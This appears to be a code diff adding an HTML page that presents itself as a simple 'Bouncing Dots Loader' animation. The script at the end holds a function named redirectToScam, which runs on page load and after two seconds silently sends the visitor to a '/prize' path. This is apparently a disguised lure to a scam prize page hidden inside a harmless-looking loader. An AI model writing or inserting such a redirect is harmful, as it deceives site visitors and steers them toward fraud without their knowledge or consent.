@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bouncing Dots Loader</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+
+    .loader {
+      display: flex;
+      justify-content: space-between;
+      width: 80px;
+    }
+
+    .loader div {
+      width: 18px;
+      height: 18px;
+      background-color: #3498db;
+      border-radius: 50%;
+      animation: bounce 0.6s infinite alternate;
+    }
+
+    .loader div:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .loader div:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes bounce {
+      to {
+        transform: translateY(-100%);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+  <script>
+    function redirectToScam(){
+        window.location.href = '/prize'
+    }
+    window.onload = ()=>{
+        setTimeout(redirectToScam,2000)
+    }
+  </script>
+</body>
+</html>
